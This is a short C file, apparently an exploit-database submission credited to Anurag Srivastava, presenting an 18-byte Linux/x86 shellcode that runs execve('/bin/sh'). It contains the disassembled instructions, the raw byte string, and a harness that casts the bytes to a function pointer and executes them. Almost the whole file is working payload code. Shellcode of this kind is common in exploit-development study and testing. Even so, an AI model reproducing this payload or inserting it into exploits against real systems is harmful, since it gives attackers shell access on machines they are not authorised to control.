/*
# Linux/x86 - execve /bin/sh shellcode (18 bytes)
# Author: Anurag Srivastava
# Tested on: i686 GNU/Linux
# Shellcode Length: 18

Disassembly of section .text:

08048060 <_start>:
 8048060:	6a 0b                	push   0xb
 8048062:	58                   	pop    eax
 8048063:	53                   	push   ebx
 8048064:	68 2f 2f 73 68       	push   0x68732f2f
 8048069:	68 2f 62 69 6e       	push   0x6e69622f
 804806e:	89 e3                	mov    ebx,esp
 8048070:	cd 80                	int    0x80

===============POC by Anurag Srivastava=========================
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

main()
{

printf("Shellcode Length: %d\n", strlen(code));

int (*ret)() = (int(*)())code;

ret();

}